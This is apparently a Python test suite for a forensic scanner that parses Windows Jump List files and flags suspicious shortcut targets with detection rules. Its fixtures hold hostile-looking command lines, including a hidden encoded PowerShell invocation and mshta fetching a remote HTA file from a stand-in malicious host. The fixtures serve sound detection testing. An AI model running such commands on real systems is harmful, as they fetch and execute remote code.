"""Tests for the Security Engine and Detection Rules — Windows Jump List Analyzer.

Two layers, both against REAL bytes, no mocking of olefile or the parsers:

  1. Rule-level unit tests: pure-function detection rules against synthetic
     context dicts (fast, focused on rule logic).
  2. Engine-level tests: a genuinely valid OLE2/CFBF compound file is built
     from scratch (see tests/ole_writer.py — `olefile` has no write API, so
     we implement a small real spec-following CFBF writer ourselves) and a
     genuine CustomDestinations-ms raw-byte file is built (see
     tests/lnk_builder.py for real embedded-LNK bytes). Both are written to
     real temp files, and the actual ScanEngine (real olefile.OleFileIO
     opens, real struct-based MS-SHLLINK parsing, real DestList parsing)
     is run against them.
"""
import os
import struct
import sys
import tempfile
import shutil

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.security_engine import ScanEngine
from app.security_engine.lnk_parser import parse_lnk_bytes, find_lnk_offsets, LnkParseError
from app.security_engine.destlist_parser import parse_destlist
from app.detection_rules import (
    rule_removable_or_network_target,
    rule_suspicious_command_line_indicators,
    rule_excessive_distinct_targets_for_appid,
    rule_sensitive_document_access,
    rule_corrupt_lnk_stream,
    rule_custom_destinations_format,
    ALL_RULES,
)

from tests.ole_writer import build_minimal_ole
from tests.lnk_builder import build_lnk_bytes


# ---------------------------------------------------------------------------
# Rule-level unit tests (synthetic context dicts)
# ---------------------------------------------------------------------------

def test_rule_removable_target_fires():
    ctx = {"kind": "lnk", "file_path": "x.automaticDestinations-ms",
           "target_path": "E:\\payload.exe", "arguments": None,
           "is_removable": True, "is_network": False}
    result = rule_removable_or_network_target(ctx)
    assert result and result["rule_id"] == "WJL-001"


def test_rule_network_target_fires():
    ctx = {"kind": "destlist_entry", "file_path": "x.automaticDestinations-ms",
           "target_path": "\\\\SERVER\\share\\doc.docx", "arguments": None,
           "is_removable": False, "is_network": True}
    result = rule_removable_or_network_target(ctx)
    assert result and result["rule_id"] == "WJL-001"


def test_rule_removable_target_absent_on_local_fixed():
    ctx = {"kind": "lnk", "file_path": "x", "target_path": "C:\\Users\\bob\\doc.txt",
           "arguments": None, "is_removable": False, "is_network": False}
    assert rule_removable_or_network_target(ctx) is None


def test_rule_suspicious_command_line_detects_encoded_powershell():
    ctx = {"kind": "lnk", "file_path": "x", "target_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
           "arguments": "-nop -w hidden -enc SQBFAFgA"}
    result = rule_suspicious_command_line_indicators(ctx)
    assert result and result["rule_id"] == "WJL-002"


def test_rule_suspicious_command_line_detects_mshta():
    ctx = {"kind": "lnk", "file_path": "x", "target_path": "C:\\Windows\\System32\\mshta.exe",
           "arguments": "http://malicious.example/payload.hta"}
    result = rule_suspicious_command_line_indicators(ctx)
    assert result and "mshta" in result["description"].lower()


def test_rule_suspicious_command_line_absent_on_clean_args():
    ctx = {"kind": "lnk", "file_path": "x", "target_path": "C:\\Program Files\\Notepad++\\notepad++.exe",
           "arguments": "C:\\Users\\bob\\notes.txt"}
    assert rule_suspicious_command_line_indicators(ctx) is None


def test_rule_excessive_distinct_targets_fires_above_threshold():
    ctx = {"kind": "appid_summary", "file_path": "x", "app_id": "abc123", "distinct_target_count": 25}
    result = rule_excessive_distinct_targets_for_appid(ctx)
    assert result and result["rule_id"] == "WJL-003"


def test_rule_excessive_distinct_targets_absent_below_threshold():
    ctx = {"kind": "appid_summary", "file_path": "x", "app_id": "abc123", "distinct_target_count": 5}
    assert rule_excessive_distinct_targets_for_appid(ctx) is None


def test_rule_sensitive_document_kdbx():
    ctx = {"kind": "destlist_entry", "file_path": "x", "target_path": "C:\\Users\\bob\\Vault\\keepass.kdbx"}
    result = rule_sensitive_document_access(ctx)
    assert result and result["rule_id"] == "WJL-004"


def test_rule_sensitive_document_keyword():
    ctx = {"kind": "lnk", "file_path": "x", "target_path": "C:\\Users\\bob\\Desktop\\company_secret_plans.pptx"}
    result = rule_sensitive_document_access(ctx)
    assert result is not None


def test_rule_sensitive_document_absent_on_normal_file():
    ctx = {"kind": "lnk", "file_path": "x", "target_path": "C:\\Users\\bob\\Documents\\report.docx"}
    assert rule_sensitive_document_access(ctx) is None


def test_rule_corrupt_lnk_stream_fires():
    ctx = {"kind": "parse_error", "file_path": "x", "app_id": "abc", "note": "bad CLSID"}
    result = rule_corrupt_lnk_stream(ctx)
    assert result and result["rule_id"] == "WJL-005"


def test_rule_custom_destinations_format_fires():
    ctx = {"kind": "custom_format", "file_path": "x.customDestinations-ms", "app_id": "abc", "note": "1024 bytes scanned"}
    result = rule_custom_destinations_format(ctx)
    assert result and result["rule_id"] == "WJL-006"


def test_all_rules_registered():
    assert len(ALL_RULES) == 6


# ---------------------------------------------------------------------------
# LNK / DestList parser unit tests (real bytes, real struct parsing)
# ---------------------------------------------------------------------------

def test_parse_lnk_bytes_local_removable_target():
    data = build_lnk_bytes(local_target="E:\\payload\\", drive_type=2, arguments="-enc AAAA")
    parsed = parse_lnk_bytes(data)
    assert parsed["target_path"] == "E:\\payload\\"
    assert parsed["is_removable"] is True
    assert parsed["is_network"] is False
    assert parsed["arguments"] == "-enc AAAA"


def test_parse_lnk_bytes_network_target():
    data = build_lnk_bytes(net_name="\\\\FILESERVER\\share", path_suffix="doc.pdf")
    parsed = parse_lnk_bytes(data)
    assert parsed["target_path"] == "\\\\FILESERVER\\share\\doc.pdf"
    assert parsed["is_network"] is True


def test_parse_lnk_bytes_rejects_bad_signature():
    bad = b"\x00" * 100
    try:
        parse_lnk_bytes(bad)
        assert False, "expected LnkParseError"
    except LnkParseError:
        pass


def test_parse_lnk_bytes_rejects_truncated_buffer():
    data = build_lnk_bytes(local_target="C:\\x\\", drive_type=3)
    try:
        parse_lnk_bytes(data[:80])
        assert False, "expected LnkParseError"
    except LnkParseError:
        pass


def test_find_lnk_offsets_locates_embedded_blob_with_junk_around_it():
    lnk = build_lnk_bytes(local_target="D:\\x\\", drive_type=2)
    blob = b"JUNKJUNKJUNK" + lnk + b"MOREJUNK"
    offsets = find_lnk_offsets(blob)
    assert offsets == [len(b"JUNKJUNKJUNK")]


def test_parse_destlist_recovers_entries_from_real_bytes():
    # Real minimal DestList: header (24 bytes for v1) then one real entry
    # following this parser's documented Win7/8 layout.
    version = struct.pack("<I", 1)
    header = version + b"\x00" * 20  # 24-byte v1 header
    unknown0 = b"\x00" * 8
    netbios = b"\x00" * 16  # empty -> local target
    guids = b"\x00" * 64  # 4 x 16-byte GUIDs
    filetime = struct.pack("<Q", 132000000000000000)
    pin_status = b"\x00" * 4
    path = "C:\\Users\\bob\\Documents\\report.docx"
    path_bytes = path.encode("utf-16-le")
    entry = unknown0 + netbios + guids + filetime + pin_status + struct.pack("<H", len(path)) + path_bytes
    data = header + entry
    entries, note = parse_destlist(data)
    assert len(entries) == 1
    assert entries[0]["target_path"] == path


def test_parse_destlist_too_short_reports_note():
    entries, note = parse_destlist(b"\x01\x00")
    assert entries == []
    assert note is not None


# ---------------------------------------------------------------------------
# Genuine engine-level tests: real OLE2 file built by hand, real ScanEngine
# ---------------------------------------------------------------------------

def _write_temp_file(tmpdir, filename, data):
    path = os.path.join(tmpdir, filename)
    with open(path, "wb") as f:
        f.write(data)
    return path


def test_engine_parses_real_automatic_destinations_ole_file():
    tmpdir = tempfile.mkdtemp()
    try:
        lnk = build_lnk_bytes(local_target="E:\\exfil\\", drive_type=2,
                               arguments="-enc SQBFAFgA")
        ole_bytes = build_minimal_ole({"1": lnk})
        path = _write_temp_file(tmpdir, "1234567890abcdef.automaticDestinations-ms", ole_bytes)

        engine = ScanEngine(path)
        result = engine.run()

        assert result["files_scanned"] == 1
        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "WJL-001" in rule_ids  # removable-media target
        assert "WJL-002" in rule_ids  # -enc suspicious indicator
        assert all(f["file_path"] == path for f in result["findings"])
    finally:
        shutil.rmtree(tmpdir)


def test_engine_parses_real_destlist_stream_alongside_lnk_stream():
    tmpdir = tempfile.mkdtemp()
    try:
        lnk = build_lnk_bytes(local_target="C:\\Program Files\\App\\", drive_type=3)

        version = struct.pack("<I", 1)
        header = version + b"\x00" * 20
        unknown0 = b"\x00" * 8
        netbios = b"\x00" * 16
        guids = b"\x00" * 64
        filetime = struct.pack("<Q", 132000000000000000)
        pin_status = b"\x00" * 4
        path = "C:\\Users\\bob\\Vault\\master.kdbx"
        path_bytes = path.encode("utf-16-le")
        dl_entry = unknown0 + netbios + guids + filetime + pin_status + struct.pack("<H", len(path)) + path_bytes
        destlist_bytes = header + dl_entry

        ole_bytes = build_minimal_ole({"DestList": destlist_bytes, "1": lnk})
        path_on_disk = _write_temp_file(tmpdir, "fedcba0987654321.automaticDestinations-ms", ole_bytes)

        engine = ScanEngine(path_on_disk)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "WJL-004" in rule_ids  # .kdbx sensitive document from DestList
    finally:
        shutil.rmtree(tmpdir)


def test_engine_reports_corrupt_stream_without_crashing():
    tmpdir = tempfile.mkdtemp()
    try:
        good_lnk = build_lnk_bytes(local_target="D:\\ok\\", drive_type=2)
        corrupt = b"\x00" * 90  # too short / bad signature -> unparseable
        ole_bytes = build_minimal_ole({"1": good_lnk, "2": corrupt})
        path = _write_temp_file(tmpdir, "aaaaaaaaaaaaaaaa.automaticDestinations-ms", ole_bytes)

        engine = ScanEngine(path)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "WJL-005" in rule_ids
        assert result["files_scanned"] == 1
    finally:
        shutil.rmtree(tmpdir)


def test_engine_parses_real_custom_destinations_raw_file():
    tmpdir = tempfile.mkdtemp()
    try:
        lnk = build_lnk_bytes(net_name="\\\\FILESERVER\\shares", path_suffix="budget_secret.xlsx",
                               arguments="mshta http://malicious.example/x.hta")
        data = b"CUSTOM_DEST_PREAMBLE_BYTES" + lnk + b"TRAILING_FRAMING_BYTES"
        path = _write_temp_file(tmpdir, "0011223344556677.customDestinations-ms", data)

        engine = ScanEngine(path)
        result = engine.run()

        assert result["files_scanned"] == 1
        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "WJL-006" in rule_ids  # custom-destinations format note
        assert "WJL-001" in rule_ids  # network target
        assert "WJL-002" in rule_ids  # mshta indicator
    finally:
        shutil.rmtree(tmpdir)


def test_engine_walks_directory_of_jump_list_files():
    tmpdir = tempfile.mkdtemp()
    try:
        lnk1 = build_lnk_bytes(local_target="E:\\a\\", drive_type=2)
        lnk2 = build_lnk_bytes(local_target="C:\\b\\", drive_type=3)
        ole1 = build_minimal_ole({"1": lnk1})
        ole2 = build_minimal_ole({"1": lnk2})
        _write_temp_file(tmpdir, "1111111111111111.automaticDestinations-ms", ole1)
        _write_temp_file(tmpdir, "2222222222222222.automaticDestinations-ms", ole2)
        _write_temp_file(tmpdir, "not_a_jumplist.txt", b"irrelevant")

        engine = ScanEngine(tmpdir)
        result = engine.run()

        assert result["files_scanned"] == 2
        assert result["dirs_scanned"] >= 1
    finally:
        shutil.rmtree(tmpdir)


def test_engine_handles_nonexistent_path_gracefully():
    engine = ScanEngine("/this/path/does/not/exist/at/all")
    result = engine.run()
    assert result["files_scanned"] == 0
    assert isinstance(result["findings"], list)


def test_engine_handles_non_ole_automatic_destinations_file():
    tmpdir = tempfile.mkdtemp()
    try:
        path = _write_temp_file(tmpdir, "badfile0123456789.automaticDestinations-ms", b"not an OLE file at all")
        engine = ScanEngine(path)
        result = engine.run()
        assert result["files_scanned"] == 1
        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "WJL-005" in rule_ids
    finally:
        shutil.rmtree(tmpdir)
